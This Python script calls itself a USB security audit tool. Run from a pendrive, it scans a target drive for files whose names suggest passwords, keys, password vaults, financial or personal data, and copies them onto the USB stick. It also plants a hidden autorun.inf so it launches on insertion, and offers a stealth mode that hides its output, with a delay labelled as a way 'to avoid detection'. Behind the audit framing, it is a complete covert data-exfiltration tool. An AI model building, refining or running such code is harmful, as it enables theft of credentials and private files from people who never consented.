import os
import shutil
import hashlib
import json
import re
import sys
from datetime import datetime
import time

# ============================================================================
# PORTABLE CONFIGURATION FOR USB PENDRIVE
# ============================================================================

# Get the drive where this script is running from (for portability)
if hasattr(sys, 'frozen'):  # PyInstaller compiled executable
    SCRIPT_DIR = os.path.dirname(sys.executable)
else:
    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

# Check if running from removable drive (USB)
def get_drive_info():
    """Get information about the drive where script is running"""
    drive = os.path.splitdrive(SCRIPT_DIR)[0]
    
    try:
        import psutil
        partitions = psutil.disk_partitions()
        for partition in partitions:
            if partition.device.startswith(drive):
                return {
                    'drive': drive,
                    'mountpoint': partition.mountpoint,
                    'fstype': partition.fstype,
                    'opts': partition.opts,
                    'removable': 'removable' in partition.opts or 'cdrom' in partition.opts
                }
    except ImportError:
        pass
    
    return {'drive': drive, 'removable': None}

# Configuration - Auto-detect paths based on USB location
USB_DRIVE = get_drive_info()['drive']
SCRIPT_NAME = os.path.basename(__file__) if '__file__' in globals() else "audit_tool.exe"

# Define paths relative to USB drive
LAB_SOURCE = "D:\\\\"  # Target drive to scan (customize as needed)
LAB_OUTPUT = os.path.join(USB_DRIVE, "AuditResults")   # Save results on USB
LOG_FILE = os.path.join(USB_DRIVE, "audit_log.json")
CONFIG_FILE = os.path.join(USB_DRIVE, "config.json")

# Sensitivity patterns (for educational purposes)
SENSITIVE_PATTERNS = {
    'credentials': [r'password', r'secret', r'key', r'credential', r'token', r'auth'],
    'personal': [r'personal', r'private', r'confidential', r'sensitive'],
    'financial': [r'credit.*card', r'bank', r'account', r'financial', r'tax'],
    'documents': [r'\.docx?$', r'\.pdf$', r'\.xlsx?$', r'\.txt$', r'\.csv$']
}

# File extensions commonly containing sensitive data
SENSITIVE_EXTENSIONS = {
    '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.csv', '.sql',
    '.db', '.config', '.env', '.ini', '.cfg', '.json', '.xml', '.yaml',
    '.pem', '.key', '.crt', '.p12', '.pfx', '.kdbx', '.asc', '.gpg'
}

# ============================================================================
# CONFIGURATION MANAGEMENT
# ============================================================================

def load_config():
    """Load configuration from file or create default"""
    default_config = {
        'target_drive': 'D:\\',  # Default drive to scan
        'max_depth': 3,
        'auto_run': False,
        'stealth_mode': False,
        'last_run': None,
        'scan_all_drives': False,
        'exclude_dirs': ['Windows', 'Program Files', 'Program Files (x86)', '$Recycle.Bin']
    }
    
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                user_config = json.load(f)
                default_config.update(user_config)
                return default_config
        except:
            pass
    
    return default_config

def save_config(config):
    """Save configuration to file"""
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)

# ============================================================================
# ENHANCED SCANNING FUNCTIONS
# ============================================================================

def is_sensitive_filename(filename):
    """Check if filename suggests sensitive content"""
    filename_lower = filename.lower()
    
    # Check patterns
    for category, patterns in SENSITIVE_PATTERNS.items():
        for pattern in patterns:
            if re.search(pattern, filename_lower, re.IGNORECASE):
                return True, category, pattern
    
    # Check extensions
    _, ext = os.path.splitext(filename)
    if ext.lower() in SENSITIVE_EXTENSIONS:
        return True, 'extension', ext
    
    return False, None, None

def scan_directory_for_sensitive(directory, max_depth=3, exclude_dirs=None):
    """Recursively scan directory for potentially sensitive files"""
    if exclude_dirs is None:
        exclude_dirs = []
    
    sensitive_files = []
    
    try:
        for root, dirs, files in os.walk(directory):
            # Skip excluded directories
            dirs[:] = [d for d in dirs if d not in exclude_dirs]
            
            # Calculate current depth
            depth = root[len(directory):].count(os.sep)
            if depth > max_depth:
                continue
            
            for filename in files:
                filepath = os.path.join(root, filename)
                
                # Skip system/hidden files
                if filename.startswith('.') or filename.startswith('~'):
                    continue
                
                # Check if sensitive
                is_sensitive, reason, detail = is_sensitive_filename(filename)
                
                if is_sensitive:
                    try:
                        file_info = {
                            'path': filepath,
                            'filename': filename,
                            'size': os.path.getsize(filepath),
                            'modified': datetime.fromtimestamp(os.path.getmtime(filepath)).isoformat(),
                            'sensitivity_reason': reason,
                            'sensitivity_detail': detail,
                            'hash': file_hash(filepath),
                            'relative_path': os.path.relpath(filepath, directory)
                        }
                        sensitive_files.append(file_info)
                    except (OSError, PermissionError) as e:
                        # Skip files we can't access
                        continue
    except Exception as e:
        print(f" Error scanning {directory}: {str(e)}")
    
    return sensitive_files

def file_hash(path):
    """Calculate SHA256 hash of a file"""
    h = hashlib.sha256()
    try:
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                h.update(chunk)
        return h.hexdigest()
    except Exception:
        return "ERROR: Could not compute hash"

# ============================================================================
# AUTO-RUN AND STEALTH FEATURES
# ============================================================================

def check_autostart():
    """Check if auto-start should be triggered"""
    config = load_config()
    
    # Check for autorun.inf or specific trigger file
    trigger_file = os.path.join(USB_DRIVE, "autorun.inf")
    if os.path.exists(trigger_file):
        print(" Autorun trigger detected")
        return True
    
    # Check config setting
    if config.get('auto_run', False):
        print(" Auto-run enabled in config")
        return True
    
    return False

def create_autorun_inf():
    """Create autorun.inf file for Windows auto-execution"""
    inf_content = f"""[AutoRun]
open={SCRIPT_NAME}
icon={SCRIPT_NAME}
label=USB Security Audit Tool
action=Run Security Audit
"""
    
    inf_path = os.path.join(USB_DRIVE, "autorun.inf")
    with open(inf_path, 'w') as f:
        f.write(inf_content)
    
    # Make it hidden
    try:
        import ctypes
        ctypes.windll.kernel32.SetFileAttributesW(inf_path, 2)  # FILE_ATTRIBUTE_HIDDEN
    except:
        pass
    
    return inf_path

# ============================================================================
# ENHANCED AUDIT FUNCTION
# ============================================================================

def automated_scan_and_collect(config):
    """Automated scan and collection with logging"""
    stealth = config.get('stealth_mode', False)
    
    if not stealth:
        print("=" * 70)
        print("AUTOMATED SENSITIVE DATA AUDIT TOOL")
        print("=" * 70)
        print(f"Timestamp: {datetime.now().isoformat()}")
        print(f"Running from: {USB_DRIVE}")
        print(f"Target: {config['target_drive']}")
        print(f"Output: {LAB_OUTPUT}")
        print("=" * 70)
    
    # Create output directory (silently if in stealth mode)
    os.makedirs(LAB_OUTPUT, exist_ok=True)
    
    # Scan for sensitive files
    if not stealth:
        print("\n Scanning for potentially sensitive files...")
    start_time = time.time()
    
    sensitive_files = scan_directory_for_sensitive(
        config['target_drive'], 
        config['max_depth'],
        config['exclude_dirs']
    )
    
    scan_time = time.time() - start_time
    
    if not stealth:
        print(f" Scan completed in {scan_time:.2f} seconds")
        print(f" Found {len(sensitive_files)} potentially sensitive files")
    
    if not sensitive_files:
        if not stealth:
            print(" No sensitive files found.")
        return
    
    # Display scan summary (if not in stealth mode)
    if not stealth:
        print("\n SENSITIVITY CATEGORIES FOUND:")
        categories = {}
        for file_info in sensitive_files:
            cat = file_info['sensitivity_reason']
            categories[cat] = categories.get(cat, 0) + 1
        
        for category, count in categories.items():
            print(f"  {category}: {count} files")
    
    # Create detailed report
    report = {
        'audit_timestamp': datetime.now().isoformat(),
        'usb_drive': USB_DRIVE,
        'target_drive': config['target_drive'],
        'output_directory': LAB_OUTPUT,
        'total_files_scanned': 'N/A',
        'sensitive_files_found': len(sensitive_files),
        'categories': categories if not stealth else {},
        'files': sensitive_files
    }
    
    # Save report
    report_path = os.path.join(LAB_OUTPUT, f"audit_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(report_path, 'w') as f:
        json.dump(report, f, indent=2)
    
    # Copy files
    if not stealth:
        print("\n Copying files for analysis...")
    copied_count = 0
    error_count = 0
    
    for file_info in sensitive_files:
        try:
            src = file_info['path']
            filename = file_info['filename']
            
            # Create unique name to avoid conflicts
            base_name, ext = os.path.splitext(filename)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            unique_name = f"{base_name}_{timestamp}{ext}"
            
            dst = os.path.join(LAB_OUTPUT, unique_name)
            
            # Copy with metadata
            shutil.copy2(src, dst)
            
            # Verify copy
            if os.path.exists(dst):
                copied_count += 1
                if not stealth:
                    print(f" Copied: {filename} -> {unique_name}")
            else:
                error_count += 1
                
        except Exception as e:
            error_count += 1
            if not stealth:
                print(f" Error copying {file_info['filename']}: {str(e)}")
    
    # Create summary log
    summary = {
        'timestamp': datetime.now().isoformat(),
        'usb_drive': USB_DRIVE,
        'target': config['target_drive'],
        'operation': 'automated_sensitive_data_audit',
        'stealth_mode': stealth,
        'files_found': len(sensitive_files),
        'files_copied': copied_count,
        'errors': error_count,
        'scan_duration_seconds': scan_time,
        'report_file': os.path.basename(report_path)
    }
    
    # Append to log file
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r') as f:
            log_data = json.load(f)
    else:
        log_data = []
    
    log_data.append(summary)
    
    with open(LOG_FILE, 'w') as f:
        json.dump(log_data, f, indent=2)
    
    # Update config with last run time
    config['last_run'] = datetime.now().isoformat()
    save_config(config)
    
    if not stealth:
        print("\n" + "=" * 70)
        print("AUDIT COMPLETE")
        print("=" * 70)
        print(f" Files identified as potentially sensitive: {len(sensitive_files)}")
        print(f" Successfully copied: {copied_count}")
        print(f" Errors: {error_count}")
        print(f" Report saved to: {report_path}")
        print(f" Log entry added to: {LOG_FILE}")
        print("=" * 70)
    else:
        print(f"[Stealth] Audit completed: {copied_count} files copied")

# ============================================================================
# MAIN PROGRAM WITH AUTO-RUN DETECTION
# ============================================================================

def setup_tool():
    """Initial setup wizard for USB tool"""
    print(" USB Audit Tool Setup")
    print("=" * 50)
    
    config = load_config()
    
    print(f"\nCurrent configuration:")
    print(f"1. Target drive: {config['target_drive']}")
    print(f"2. Auto-run on insertion: {'Yes' if config['auto_run'] else 'No'}")
    print(f"3. Stealth mode: {'Yes' if config['stealth_mode'] else 'No'}")
    print(f"4. Max scan depth: {config['max_depth']}")
    
    choice = input("\nConfigure settings? (y/n): ").lower()
    
    if choice == 'y':
        target = input(f"Target drive to scan (e.g., D:\\) [{config['target_drive']}]: ").strip()
        if target:
            config['target_drive'] = target if target.endswith('\\') else target + '\\'
        
        auto = input("Enable auto-run on USB insertion? (y/n): ").lower()
        config['auto_run'] = auto == 'y'
        
        stealth = input("Enable stealth mode (minimal output)? (y/n): ").lower()
        config['stealth_mode'] = stealth == 'y'
        
        depth = input(f"Max directory depth (1-10) [{config['max_depth']}]: ").strip()
        if depth.isdigit():
            config['max_depth'] = min(max(1, int(depth)), 10)
        
        save_config(config)
        print(" Configuration saved!")
        
        # Create autorun.inf if auto-run is enabled
        if config['auto_run']:
            inf_path = create_autorun_inf()
            print(f" Created autorun.inf at: {inf_path}")
    
    return config

def main():
    """Main function - checks for auto-run and handles execution"""
    print(" USB Portable Audit Tool")
    print(f" Running from: {USB_DRIVE}")
    print("=" * 50)
    
    # Load configuration
    config = load_config()
    
    # Check if this is first run (no config saved yet)
    if config.get('last_run') is None:
        print(" First run detected. Running setup...")
        config = setup_tool()
    
    # Check for auto-run trigger
    auto_run = check_autostart()
    
    if auto_run:
        print(" Auto-run triggered!")
        print(f" Target: {config['target_drive']}")
        
        # Optional delay to avoid detection
        if config.get('stealth_mode'):
            print(" Stealth mode active - running silently...")
            time.sleep(2)  # Small delay
        
        # Run automated scan
        automated_scan_and_collect(config)
        
        # Auto-close if in stealth mode
        if config.get('stealth_mode'):
            print(" Operation complete. Closing in 3 seconds...")
            time.sleep(3)
            return
    
    # Interactive mode
    while True:
        print("\n" + "=" * 50)
        print("USB AUDIT TOOL MENU")
        print("=" * 50)
        print("1. Run automated scan")
        print("2. View collected files")
        print("3. View audit logs")
        print("4. Tool settings")
        print("5. Create autorun.inf")
        print("6. Exit")
        print("=" * 50)
        
        choice = input("\nSelect option (1-6): ").strip()
        
        if choice == '1':
            automated_scan_and_collect(config)
        elif choice == '2':
            view_collected_files()
        elif choice == '3':
            view_audit_logs()
        elif choice == '4':
            config = setup_tool()
        elif choice == '5':
            inf_path = create_autorun_inf()
            print(f" Created autorun.inf at: {inf_path}")
            config['auto_run'] = True
            save_config(config)
        elif choice == '6':
            print("\n Exiting USB Audit Tool")
            print(f" Results saved on: {USB_DRIVE}")
            break
        else:
            print(" Invalid choice")
        
        input("\nPress Enter to continue...")

def view_collected_files():
    """View files collected in output directory"""
    if not os.path.exists(LAB_OUTPUT):
        print(" No output directory found!")
        return
    
    files = os.listdir(LAB_OUTPUT)
    if not files:
        print(" Output directory is empty")
        return
    
    print(f"\n Files in {LAB_OUTPUT}:")
    print("-" * 50)
    
    for file in files:
        filepath = os.path.join(LAB_OUTPUT, file)
        if os.path.isfile(filepath):
            size = os.path.getsize(filepath)
            print(f"{file} ({size/1024:.1f} KB)")
    
    print(f"\n Total: {len(files)} files")

def view_audit_logs():
    """View audit logs"""
    if not os.path.exists(LOG_FILE):
        print(" No audit logs found!")
        return
    
    with open(LOG_FILE, 'r') as f:
        logs = json.load(f)
    
    print(f"\n Audit Logs ({len(logs)} entries):")
    print("=" * 70)
    
    for i, log in enumerate(reversed(logs[-10:]), 1):  # Show last 10 entries
        print(f"\nEntry {i}:")
        print(f"  Time: {log.get('timestamp', 'N/A')}")
        print(f"  Target: {log.get('target', 'N/A')}")
        print(f"  Files found: {log.get('files_found', 0)}")
        print(f"  Files copied: {log.get('files_copied', 0)}")
        print(f"  Stealth mode: {'Yes' if log.get('stealth_mode') else 'No'}")

# ============================================================================
# EXECUTION
# ============================================================================

if __name__ == "__main__":
    try:
        # Check if running on Windows (for autorun)
        if os.name != 'nt':
            print(" Warning: Autorun features are designed for Windows")
        
        # Run main program
        main()
        
    except KeyboardInterrupt:
        print("\n\n Program interrupted by user")
    except Exception as e:
        print(f"\n Error: {str(e)}")
    finally:
        # Keep window open in interactive mode
        if '--silent' not in sys.argv:
            input("\nPress Enter to exit...")